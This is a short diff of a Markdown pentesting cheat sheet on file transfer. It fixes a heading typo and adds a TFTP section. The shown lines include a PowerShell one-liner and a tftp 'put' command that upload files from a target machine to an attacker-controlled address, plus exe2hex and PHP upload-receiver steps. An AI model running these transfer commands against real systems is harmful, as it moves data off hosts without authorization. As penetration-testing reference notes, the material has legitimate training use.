@@ -41,7 +41,7 @@ exe2hex -x file.exe -p fild.cmd
 cat file.cmd | xclip -selection clipboard
 ```
 
-# File Donwloads
+# File Downloads
 
 ## Local upload PHP
 
@@ -60,4 +60,14 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
 From target:
 ```
 powershell (New-Object System.Net.WebClient).UploadFile('http://ipaddress/upload.php', 'filename')
+```
+
+### TFTP
+
+```
+sudo atftpd --daemon --port 69 /tftp
+```
+Credential-less transfer!
+```
+tftp -i ouripaddress put filename
 ```
